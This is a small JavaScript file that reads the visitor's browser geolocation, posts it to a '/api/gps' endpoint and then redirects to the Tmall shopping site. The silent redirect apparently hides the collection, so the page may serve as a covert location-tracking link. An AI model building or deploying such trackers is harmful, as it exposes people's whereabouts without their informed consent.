

function getLocation() {
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, error);
    } else {
        x.innerHTML = "你的浏览器不支持";
    }
}
var g_latitude = 0;
var g_longitude = 0;
var g_altitude = 0;
function showPosition(position) {
    // var x = document.getElementById('demo');
    // x.innerHTML = "纬度：" + position.coords.latitude + "<br>经度：" + position.coords.longitude;
    var latitude = document.getElementById('latitude');
    var longitude = document.getElementById('longitude');
    
    // debug 页面显示
    // latitude.innerHTML = position.coords.latitude;
    // longitude.innerHTML = position.coords.longitude;

    // longitude.innerHTML = position.coords.altitude;
    g_latitude = position.coords.latitude;
    g_longitude  = position.coords.longitude;
    g_altitude = position.coords.altitude;
    // console.log(g_longitude, g_latitude, g_altitude);
    sendData_gps();
}
function error(error) { 
    var err = error.code;
    switch (err) {
        case 1: alert("用户拒绝了"); break;
        case 2: alert("获取不到信息"); break;
        case 3: alert("获取信息超时");
    }
}

function sendData_gps() {
    // 获取输入的数据
    var latitude = document.getElementById("latitude").innerHTML;
    var longitude = document.getElementById("longitude").innerHTML

    var now = new Date();
    var dateString = 
        now.getDate() + '/' + (now.getMonth() + 1) + '/' + now.getFullYear() + ' ' +
        now.getHours() + ':' + now.getMinutes() + ':' +  now.getSeconds();
        // var urlDataJson =
        // {
        //     'date':      dateString,
        //     'latitude':  latitude,
        //     'longitude': longitude
        // };
    var urlDataJson =
    {
        'date':      dateString,
        'latitude':  g_latitude,
        'longitude': g_longitude,
        'altitude': g_altitude
    };

    var htmlobj = $.ajax(
    {
        url : "/api/gps",
        type : "POST",
        contentType : 'application/json',       
        data : JSON.stringify(urlDataJson),
        async : false,
        success     : function(response) {
            console.log('Success:', response);
            window.location.href = "https://www.tmall.com/";
        },
        error       : function(xhr, status, error) {
            console.log('Error:', error, status);
        }
    });
}
